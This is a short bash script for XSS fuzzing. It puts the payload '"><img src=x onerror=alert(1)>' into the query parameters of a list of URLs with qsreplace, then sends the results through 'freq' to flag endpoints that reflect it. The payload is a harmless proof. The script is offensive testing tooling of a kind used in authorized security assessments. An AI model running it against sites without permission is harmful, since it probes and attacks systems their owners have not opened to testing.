#!/bin/bash

# Function to perform XSS fuzzing for given URLs
xss_fuzzing() {
    local input_file=$1
    local base_dir=$(dirname "${input_file}")
    local exploit_dir="${base_dir}/exploit"
    
    # Check if input file exists
    if [[ ! -f "${input_file}" ]]; then
        echo "Error: ${input_file} not found!"
        exit 1
    fi

    # Check if qsreplace is installed
    if ! command -v qsreplace &> /dev/null; then
        echo "Error: qsreplace is not installed. Please install it first."
        exit 1
    fi

    # Create exploit directory if it doesn't exist
    mkdir -p "${exploit_dir}"

    # Create xss_fuzz.txt by replacing the endpoints with the XSS payload
    echo "Generating XSS payloads for URLs in ${input_file}..."
    cat "${input_file}" | qsreplace '"><img src=x onerror=alert(1)>' > "${exploit_dir}/xss_fuzz.txt"
    echo "XSS payloads saved to ${exploit_dir}/xss_fuzz.txt"

    # Check if freq is installed
    if ! command -v freq &> /dev/null; then
        echo "Error: freq is not installed. Please install it first."
        exit 1
    fi

    # Analyze the frequency of endpoints in xss_fuzz.txt and save to possible_xss.txt
    echo "Analyzing frequency of endpoints..."
    cat "${exploit_dir}/xss_fuzz.txt" | freq > "${exploit_dir}/possible_xss.txt"
    echo "Frequency analysis saved to ${exploit_dir}/possible_xss.txt"

    echo "Script execution completed. Check ${exploit_dir}/possible_xss.txt for possible XSS vulnerabilities."
}

# Check if input file is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <input_file>"
    exit 1
fi

# Run the XSS fuzzing function with the provided input file
xss_fuzzing "$1"
